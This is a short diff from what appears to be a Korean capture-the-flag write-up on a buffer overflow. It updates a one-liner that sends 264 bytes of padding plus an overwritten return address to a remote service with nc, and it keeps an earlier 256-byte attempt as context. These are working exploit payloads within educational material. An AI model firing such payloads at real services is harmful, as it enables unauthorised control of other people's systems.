@@ -68,7 +68,7 @@ python3 -c 'print("A" * 256 + "\x76\x11\x40\x00")' | nc 54.85.45.101 8008
 그래서 패딩을 264바이트로 늘려 시도해보았다.
 
 ```
-python -c 'print("A" * 264 + "\x76\x11\x40\x00\x00\x00\x00\x00")' | nc 54.85.45.101 8008
+python3 -c 'print("A" * 264 + "\x76\x11\x40\x00\x00\x00\x00\x00")' | nc 54.85.45.101 8008
 ```
 
 ![image](https://github.com/user-attachments/assets/b2eb91e7-a9ba-4d90-ae74-d1931407d5e2)
